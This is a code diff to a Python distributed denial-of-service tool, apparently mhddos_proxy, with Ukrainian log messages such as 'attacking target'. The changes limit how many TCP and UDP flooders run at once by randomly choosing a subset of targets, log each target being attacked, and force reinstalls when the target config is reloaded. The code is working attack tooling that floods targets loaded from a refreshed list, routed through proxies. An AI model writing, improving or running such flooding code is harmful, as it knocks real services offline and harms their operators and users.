@@ -3,9 +3,10 @@ try: import colorama; colorama.init()
 except:raise
 # @formatter:on
 import asyncio
+from functools import partial
+import random
 import sys
 import time
-from functools import partial
 from threading import Event, Thread
 from typing import List, Set, Union
 
@@ -159,17 +160,12 @@ async def run_ddos(
             'loop': loop,
             'settings': settings,
         }
-        if not print_stats:
-            logger.info(
-                f'{cl.YELLOW}Атакуємо ціль:{cl.BLUE} %s,{cl.YELLOW} Порт:{cl.BLUE} %s,{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}'
-                % (target.url.host, target.url.port, method)
-            )
         return mhddos_main(**kwargs)
 
     active_flooder_tasks = []
     tcp_task_group = None
 
-    async def install_targets(targets):
+    async def install_targets(targets) -> bool:
         nonlocal tcp_task_group
 
         # cancel running flooders
@@ -180,7 +176,7 @@ async def run_ddos(
 
         stats.clear()
 
-        tcp_flooders, udp_flooders = [], []
+        tcp_flooders, udp_flooders, force_install = [], [], False
         for target in targets:
             assert target.is_resolved, "Unresolved target cannot be used for attack"
             # udp://, method defaults to "UDP"
@@ -204,9 +200,17 @@ async def run_ddos(
             num_init = initial_capacity * num_flooders
 
             if num_init > total_threads:
+                num_allowed = total_threads // initial_capacity
+                if num_allowed == 0:
+                    # presumably this is going to be an extreme use case
+                    raise RuntimeError("Capacity initialization error")
+                random.shuffle(tcp_flooders)
+                tcp_flooders, num_flooders = tcp_flooders[:num_allowed], num_allowed
+                force_install = True
                 logger.warning(
                     f"{cl.MAGENTA}Початкова кількість одночасних атак ({num_init}) перевищує "
-                    f"максимально дозволену параметром `-t` ({total_threads}).{cl.RESET}"
+                    f"максимально дозволену параметром -t ({total_threads}). "
+                    f"{cl.YELLOW}Обрано {num_flooders} випадкових цілей для атаки.{cl.RESET}"
                 )
 
             # adjust settings to avoid situation when we have just a few
@@ -234,6 +238,16 @@ async def run_ddos(
             task = loop.create_task(run_udp_flood(flooder))
             active_flooder_tasks.append(task)
 
+        if not print_stats:
+            for flooder in tcp_flooders + udp_flooders:
+                logger.info(
+                    f"{cl.YELLOW}Атакуємо ціль:{cl.BLUE} %s,"
+                    f"{cl.YELLOW} Порт:{cl.BLUE} %s,"
+                    f"{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}" % flooder.desc
+                )
+
+        return force_install
+
     try:
         logger.info(f'{cl.YELLOW}Завантажуємо цілі...{cl.RESET}')
         initial_targets, _ = await targets_loader.load(resolve=True)
@@ -250,7 +264,7 @@ async def run_ddos(
         # Keep the docs/info on-screen for some time before outputting the logger.info above
         await asyncio.sleep(5)
 
-    await install_targets(initial_targets)
+    force_install_targets: bool = await install_targets(initial_targets)
 
     tasks = []
 
@@ -279,24 +293,33 @@ async def run_ddos(
     else:
         print_progress(len(proxies), use_my_ip, False)
 
-    async def reload_targets(delay_seconds: int = 30):
+    async def reload_targets(delay_seconds: int = 30, force_install: bool = False):
+        force_next = force_install
         while True:
             try:
                 await asyncio.sleep(delay_seconds)
                 targets, changed = await targets_loader.load(resolve=True)
-                if changed and not targets:
+                if not changed and not force_next:
+                    logger.info(
+                        f"{cl.YELLOW}Перелік цілей не змінився - "
+                        f"чекаємо {delay_seconds} сек до наступної перевірки{cl.RESET}"
+                    )
+                elif not targets:
                     logger.warning(
-                        f"{cl.MAGENTA}Завантажено порожній конфіг - буде використано попередній{cl.RESET}"
+                        f"{cl.MAGENTA}Завантажено порожній конфіг - "
+                        f"буде використано попередній{cl.RESET}"
                     )
                 else:
-                    await install_targets(targets)
+                    force_next = await install_targets(targets)
             except asyncio.CancelledError as e:
                 raise e
             except Exception as exc:
                 logger.warning(f"{cl.MAGENTA}Не вдалося (пере)завантажити конфіг цілей: {exc}{cl.RESET}")
 
     # setup coroutine to reload targets
-    tasks.append(loop.create_task(reload_targets(delay_seconds=reload_after)))
+    targets_reloader = loop.create_task(
+        reload_targets(delay_seconds=reload_after, force_install=force_install_targets))
+    tasks.append(targets_reloader)
 
     async def reload_proxies(delay_seconds: int = 30):
         while True:
@@ -354,7 +377,7 @@ async def start(args, shutdown_event: Event):
     )
 
     # XXX: with the current implementation there's no need to
-    # have 2 separate functions to setups params for launching flooders
+    #      have 2 separate functions to setups params for launching flooders
     reload_after = 300
     connections = args.threads
     if max_conns is not None:
